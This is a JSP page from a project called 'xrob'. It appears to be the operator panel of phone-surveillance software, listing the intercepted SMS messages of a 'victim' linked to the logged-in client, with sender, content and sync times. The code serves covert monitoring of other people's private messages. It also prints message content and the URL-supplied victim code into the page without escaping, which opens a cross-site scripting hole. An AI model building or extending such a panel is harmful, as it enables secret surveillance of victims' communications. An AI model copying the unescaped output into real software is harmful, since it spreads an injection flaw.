<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.utils.CommonUtils" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%@ page import="com.theah64.xrob.api.database.tables.*" %>
<%@ page import="com.theah64.xrob.api.models.*" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Messages</title>
    <%@include file="../../common_headers.jsp" %>
    <%
        final HtmlTemplates.SearchTemplate searchTemplate = new HtmlTemplates.SearchTemplate("tMessages", "message_row");
    %>
    <script>
        $(document).ready(function () {

            <%=searchTemplate.getSearchScript()%>
        });


    </script>
</head>
<body>
<div class="container">
    <%@include file="../header.jsp" %>

    <%
        try {

            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 2, 2);
            final String victimCode = pathInfoUtils.getPart(1);
            final String msgType = pathInfoUtils.getPart(2);
            final Victims victimsTable = Victims.getInstance();
            final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

            if (theVictim != null) {

                if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {

                    final String lastUpdatedTime = Deliveries.getInstance().getLastDeliveryTime(Delivery.TYPE_MESSAGES, theVictim.getId());

    %>

    <div class="row text-center">
        <ul id="nav_menu" class="breadcrumb">
            <li><a href="/client/panel">Victims</a></li>
            <li><a href="/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
            </a></li>
            <li class="active">Messages</li>
        </ul>
    </div>

    <div class="row">


        <div class="row" style="margin-top: 20px;">

            <div class="col-md-10 content-centered">

                <%=searchTemplate.getTopTemplate(theVictim.getIdentity(),
                        lastUpdatedTime == null ? "(Not yet updated)" : "(last update " + lastUpdatedTime + ")")%>

                <%
                    final List<Message> messages = Messages.getInstance().getAll(theVictim.getId(), msgType);
                    if (messages != null) {
                %>
                <div class="row">
                    <table id="tMessages" class="table table-bordered table-condensed">
                        <tr>
                            <th>From</th>
                            <th>Content</th>
                            <th>Delivered</th>
                            <th>Synced</th>
                        </tr>

                        <%
                            for (final Message message : messages) {
                        %>
                        <tr class="message_row">

                            <td>
                                <%=CommonUtils.emptyIfNull(message.getFromName()) + "-" + CommonUtils.hyphenIfNull(message.getFromPhone())%>
                            </td>

                            <td>
                                <%=message.getContent()%>
                            </td>

                            <td><%=message.getRelativeDeliveryTime()%>
                            </td>

                            <td><%=message.getRelativeSyncTime()%>
                            </td>

                        </tr>
                        <%
                            }
                        %>

                    </table>
                </div>

            </div>
            <%
                } else {
                    throw new PathInfo.PathInfoException("No contact found!");
                }
            %>

        </div>

        <%

            } else {
                throw new PathInfo.PathInfoException("No connection established with this victim");
            }

        %>
    </div>

    <div class="row">

        <%
            } else {
                throw new PathInfo.PathInfoException("Invalid victim code");
            }
        } catch (PathInfo.PathInfoException e) {
            e.printStackTrace();
        %>
        <%=HtmlTemplates.getErrorHtml(e.getMessage())%>
        <%
            }
        %>
    </div>

</div>
</body>
</html>
